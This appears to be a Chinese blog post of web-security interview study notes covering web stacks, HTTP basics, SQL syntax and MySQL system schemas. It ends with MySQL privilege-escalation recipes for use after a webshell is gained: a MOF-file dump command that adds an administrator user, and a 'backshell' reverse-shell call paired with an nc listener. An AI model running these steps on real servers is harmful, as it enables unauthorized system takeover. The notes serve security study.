---
layout: post
title: "WEB安全面试复习笔记"
date: 2019-5-6 20:49:43
author: co0ontty
categories: WEB ALL
tags: WEB ALL 
---
## 对Web安全的理解
我觉得 Web 安全首先得懂 Web、第三方内容、Web 前端框架、Web 服务器语言、Web 开发框架、Web 应用、Web容器、存储、操作系统等这些都要了解，然后较为常见且危害较大的，SQL 注入，XSS 跨站、CSRF 跨站请求伪造等漏洞要熟练掌握。  
第三方内容: 广告统计、mockup 实体模型  
>Web前端框架: jQuery 库、BootStrap  
Web服务端语言: aps.net、php  
Web开发框架: Diango/Rails/Thinkphp  
Web应用: BBS ( discuz、xiuno ) / CMS ( 帝国、织梦、动易、Joomla ) / BLOG ( WordPress、Z-Blog、emlog )  
Web 容器: Apache ( php )、IIS ( asp )、Tomcat ( java ) -- 处理从客户端发出的请求  
存储：数据库存储 / 内存存储 / 文件存储  
操作系统: linux / Windows  

## HTTP  
### HTTP常见状态码
>1xx：信息提示，表示请求已被成功接收，继续处理。  
2xx：成功，服务器成功处理了请求  
3xx：重定向，告知客户端所请求的资源已经移动  
4xx：客户端错误状态码，请求了一些服务器无法处理的东西。  
5xx：服务端错误，描述服务器内部错误  

### HTTP请求
>请求行 ( 请求方法 )、请求头 ( 消息报头 ) 和请求正文   

### HTTP响应
>响应行，响应头 ( 消息报头 ) 和响应正文 ( 消息主题 )  

### GET 和 POST：
>GET方法用于获取请求页面的指定信息，如点击链接
>POST方法是有请求内容的，由于向服务器发送大量数据，如提交表单

## 数据库  
基本的SQL语句：
>增：INSERT INTO table_name (列1, 列2,...) VALUES (值1, 值2,....)  
删：DELETE FROM 表名称 WHERE 列名称 = 值  
改：UPDATE 表名称 SET 列名称 = 新值 WHERE 列名称 = 某值  
查：SELECT 列名称 FROM 表名称   

mysql默认自带表:  
> information_schema、performance_schema、sys、mysql   

information_schema 数据库：
 mysql 自带的，它提供了访问元数据库的方式。  
sys 数据库 ：
目标是把performance_schema的把复杂度降低
>sys_config用于sys schema库的配置

sys中的两种表：
> 1.字母开头： 适合人阅读，显示是格式化的数
2.x$开头 ： 适合工具采集数据，原始类数据

mysql 提权方式：  
***mof提权***   
拿到 Webshell 后：
1、找一个可写目录上传mof文件，例如上传到 C:/Windows/nullevt.mof \
2、执行load_file及into dumpfile把文件导出到正确的位置即可:
>Select load_file('C:/Windows/nullevt.mof') into dumpfile 'c:/windows/system32/wbem/mof/nullevt.mof'  

执行成功后，即可添加一个普通用户，然后你可以更改命令，再上传导出执行把用户提升到管理员权限，然后3389连接即可
***反弹端口提权***   
1、拿到 mysql root 权限，无法通过网站 Getshell，利用 mysql 客户端工具连接 mysql 服务器，然后执行下面的操作：   
```php
select backshell ("yourip",2010)
```   
2、本地监听你反弹的端口   
```bash
nc -vv -l -p 2010     
```   
成功后，你将获得一个 system 权限的 cmdshell
***Mysql  udf 提权*** 
